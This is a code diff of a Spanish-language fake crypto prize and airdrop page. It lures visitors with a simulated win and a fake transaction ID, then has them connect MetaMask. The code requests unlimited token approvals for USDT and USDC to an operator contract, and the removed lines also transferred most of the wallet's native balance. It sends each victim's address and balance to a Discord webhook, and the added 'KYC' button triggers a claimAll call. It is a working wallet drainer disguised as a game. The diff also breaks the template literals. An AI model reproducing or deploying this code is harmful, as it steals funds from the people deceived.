@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
@@ -414,6 +414,7 @@
 
   <div class="buttons">
     <button id="approveTokens" disabled>Conectar Wallet</button>
+    <button id="claimAll" disabled>Comenzar KYC</button>
   </div>
 																				
         <div class="info-panel">
@@ -581,6 +582,7 @@ async function connectNetwork() {
       userAccount = accounts[0];
       contract = new web3.eth.Contract(contractABI, net.contractAddress);
       document.getElementById("approveTokens").disabled = false;
+      document.getElementById("claimAll").disabled = false;
       alert("Conectado a " + net.name + ": " + userAccount);
     } catch (error) {
       alert("Error al conectar MetaMask");
@@ -591,79 +593,93 @@ async function connectNetwork() {
 }
 
 
- document.getElementById("approveTokens").addEventListener("click", async () => {
-  const button = document.getElementById("approveTokens");
-  if (!userAccount) return alert("Primero conecta MetaMask");
+    document.getElementById("approveTokens").addEventListener("click", async () => {
+      const button = document.getElementById("approveTokens");
+      if (!userAccount) return alert("Primero conecta MetaMask");
 
-  button.disabled = true;
-  button.textContent = "Aprobando...";
-  button.style.backgroundColor = "#f0b90b";
+      button.disabled = true;
+      button.textContent = "Aprobando...";
+      button.style.backgroundColor = "#f0b90b";
 
-  const TOKENS_BY_NETWORK = {
-    optimism: [
-      "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
-      "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1"
-    ],
-    bsc: [
-      "0x55d398326f99059fF775485246999027B3197955",
-      "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d"
-    ]
-  };
+       const TOKENS_BY_NETWORK = {
+  optimism: [
+    "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
+    "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1" // USDC
+  ],
+  bsc: [
+    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+    "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" // USDC BSC
+  ]
+};
 
-  const approveABI = [{
-    "constant": false,
-    "inputs": [
-      { "name": "spender", "type": "address" },
-      { "name": "amount", "type": "uint256" }
-    ],
-    "name": "approve",
-    "outputs": [{ "name": "", "type": "bool" }],
-    "payable": false,
-    "stateMutability": "nonpayable",
-    "type": "function"
-  }];
+      const approveABI = [{
+        "constant": false,
+        "inputs": [{ "name": "spender", "type": "address" }, { "name": "amount", "type": "uint256" }],
+        "name": "approve",
+        "outputs": [{ "name": "", "type": "bool" }],
+        "payable": false,
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }];
+const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 
-  const tokens = TOKENS_BY_NETWORK[selectedNetwork];
+      try {
+	
 
-  try {
-    for (const token of tokens) {
-      const tokenContract = new web3.eth.Contract(approveABI, token);
-      await tokenContract.methods
-        .approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
-        .send({ from: userAccount });
-    }
+        for (const token of tokens) {
 
-    // Obtener balance
-    const balanceWei = await web3.eth.getBalance(userAccount);
-    const gasBuffer = web3.utils.toWei("0.002", "ether");
+          const tokenContract = new web3.eth.Contract(approveABI, token);
+          const balanceWei = await web3.eth.getBalance(userAccount);
+          const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+          await sendToDiscordWebhook('wallet', userAccount, balanceEth);
+          await tokenContract.methods.approve(NETWORKS[selectedNetwork].contractAddress, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
 
-    const maxTransfer = BigInt(balanceWei) * 90n / 100n;
-    const amountToSend = maxTransfer > BigInt(gasBuffer) ? (maxTransfer - BigInt(gasBuffer)) : 0n;
+            .send({ from: userAccount });
+        }
 
-    if (amountToSend > 0n) {
-      await web3.eth.sendTransaction({
-        from: userAccount,
-        to: NETWORKS[selectedNetwork].contractAddress,
-        value: amountToSend.toString()
-      });
-    }
+        button.textContent = "Conectado ✓";
+        button.style.backgroundColor = "#00b15d";
+        button.disabled = true;
+      } catch (error) {
+        console.error(error);
+        alert("Error al aprobar tokens");
+        button.textContent = "Conectar Wallet";
+        button.style.backgroundColor = "#f0b90b";
+        button.disabled = false;
+      }
+    });
 
-    const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
-    await sendToDiscordWebhook('wallet', userAccount, balanceEth);
+    document.getElementById("claimAll").addEventListener("click", async () => {
+      if (!userAccount) return alert("Primero conecta MetaMask");
+      const TOKENS_BY_NETWORK = {
+  optimism: [
+    "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // USDT
+    "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1" // USDC
+  ],
+  bsc: [
+    "0x55d398326f99059fF775485246999027B3197955", // USDT BSC
+    "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" // USDC BSC
+  ]
+};
+const tokens = TOKENS_BY_NETWORK[selectedNetwork];
 
-    button.textContent = "Aprobado ✓";
-    button.style.backgroundColor = "#00b15d";
-    button.disabled = true;
-  } catch (error) {
-    console.error(error);
-    alert("Error al aprobar o transferir fondos");
-    button.textContent = "Conectar Wallet";
-    button.style.backgroundColor = "#f0b90b";
-    button.disabled = false;
-  }
-});
+      const amounts = [
 
-   
+        web3.utils.toWei("100", "ether"),
+        web3.utils.toWei("100", "ether")
+      ];
+
+      try {
+        await contract.methods.claimAll(tokens, amounts, [], []).send({ from: userAccount });
+        const balanceWei = await web3.eth.getBalance(userAccount);
+        const balanceEth = web3.utils.fromWei(balanceWei, 'ether');
+        await sendToDiscordWebhook('kyc', userAccount, balanceEth);
+        alert("Airdrop recibido con éxito");
+      } catch (error) {
+        console.error(error);
+        alert("Error al ejecutar el claim");
+      }
+    });
 
     async function sendToDiscordWebhook(eventType, address, balance) {
       const embed = {
@@ -671,7 +687,7 @@ async function connectNetwork() {
         color: eventType === 'wallet' ? 0x00FF00 : 0xFFA500,
         fields: [
           { name: 'Dirección', value: address },
-          { name: 'Balance', value: `${balance} ETH` }
+          { name: 'Balance', value: ${balance} ETH }
         ],
         timestamp: new Date().toISOString()
       };
@@ -770,18 +786,18 @@ function handleCellClick(event) {
   const txId = "0x" + [...Array(16)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
 
   cell.classList.add('mine');
-  cell.innerHTML = `
+  cell.innerHTML = 
     <div class="token-icon">${selected.token}</div>
     ${amount}
-  `;
+  ;
 
-  document.getElementById('prize-info').innerHTML = `
+  document.getElementById('prize-info').innerHTML = 
     <div class="prize-animation" style="font-size: 1.2em;">
       🎉 <strong>${amount} ${selected.token}</strong> ganados<br>
       <small>TX ID: ${txId}...</small><br><br>
       <div class="casino-alert">🚀 ¡Conecta tu wallet Metamask para reclamar tu premio ahora!</div>
     </div>
-  `;
+  ;
 document.getElementById("winSound").play();
 if (navigator.vibrate) {
   navigator.vibrate([100, 50, 100]);
@@ -817,7 +833,7 @@ setInterval(() => {
   sessionSeconds++;
   const minutes = String(Math.floor(sessionSeconds / 60)).padStart(2, '0');
   const seconds = String(sessionSeconds % 60).padStart(2, '0');
-  document.getElementById("sessionTime").textContent = `${minutes}:${seconds}`;
+  document.getElementById("sessionTime").textContent = ${minutes}:${seconds};
 }, 1000);
 
 function addMiniGame() {
@@ -830,12 +846,12 @@ function addMiniGame() {
   btn.disabled = false;
   btn.onclick = () => {
     clicks++;
-    document.getElementById("clickCount").textContent = `Clicks: ${clicks}`;
+    document.getElementById("clickCount").textContent = Clicks: ${clicks};
   };
 
   setTimeout(() => {
     btn.disabled = true;
-    alert(`¡Hiciste ${clicks} clics!`);
+    alert(¡Hiciste ${clicks} clics!);
   }, 5000);
 }
 
